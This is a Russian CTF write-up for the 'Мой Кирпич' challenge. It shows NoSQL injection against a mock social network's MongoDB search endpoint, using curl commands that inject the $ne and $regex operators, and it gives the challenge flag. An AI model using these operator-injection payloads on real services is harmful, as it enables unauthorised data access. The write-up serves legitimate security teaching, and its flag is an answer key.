# Мой Кирпич: Write-up

Перед нами социальная сеть. Мы можем видеть пять последних постов в целом, пять последних постов конкретного автора или добавлять новые посты.

Зайдём в Консоль разработчика в браузере и изучим, как возвращаются посты. Видим, что с сервера приходит JSON-массив из объектов постов:

```json
[
    {
        "_id": "5ebabc206ec49991593527f9",
        "author": "ivan",
        "text": "Я сегодня поработал на стройке новой школы, не отдавайте туда своих детей никогда!",
        "date": "2020-04-16 05:00:19.193000"
    }, 
    ...
]
```

С полями `author`, `text` и `date` всё понятно, а вот поле `_id` привлекает внимание: у него довольно нестандартное название и интересный формат. Поискав по запросу `database "_id"`, приходим к выводу, что это скорее всего MongoDB.

Обратим внимание на форму поиска по автору и на запрос, который она делает. Запрос уходит в тот же эндпоинт `articles`, только на этот раз это POST-запрос, в теле которого передаётся JSON-объект:

```json
{"author":"ivan"}
```

Если мы посмотрим на [формат запросов поиска в MongoDB](https://docs.mongodb.com/manual/reference/method/db.collection.find/#examples), то заметим, что они выглядят как обычные JSON-объекты. Интересно, как сервер обрабатывает пришедший запрос?

Проверим это, например, передав лишний параметр:

```
$ curl -X POST -H "Content-Type: application/json" https://mybrick.q.2020.ugractf.ru/943a294a82819e3defdef052640c2989/articles --data '{"author": "ivan", "bad": true}'
[]
```

Ничего не нашлось. Вероятно, наше поле попало в запрос. Более сложные условия, чем сравнения, в MongoDB выполняются с помощью [*операторов запроса*](https://docs.mongodb.com/manual/reference/operator/). Попробуем, например, оператор `$ne` — неравенство:

```
$ curl -X POST -H "Content-Type: application/json" https://mybrick.q.2020.ugractf.ru/943a294a82819e3defdef052640c2989/articles --data '{"author": {"$ne": "ivan"}}'
```

В ответ приходят 5 постов — действительно, мы не видим пост Ивана, но видим ещё один пост от `nagibator1972`. Можно воспользоваться оператором `$nin` и исключить все лишние записи, а можно воспользоваться оператором `$regex` — пост с флагом, скорее всего, содержит `ugra`:

```
$ curl -X POST -H "Content-Type: application/json" https://mybrick.q.2020.ugractf.ru/943a294a82819e3defdef052640c2989/articles --data '{"text": {"$regex": "ugra"}}'
```

Мы сразу же получаем пост с флагом.

Флаг: **ugra_escape_not_only_sql_48ae250f3a82**
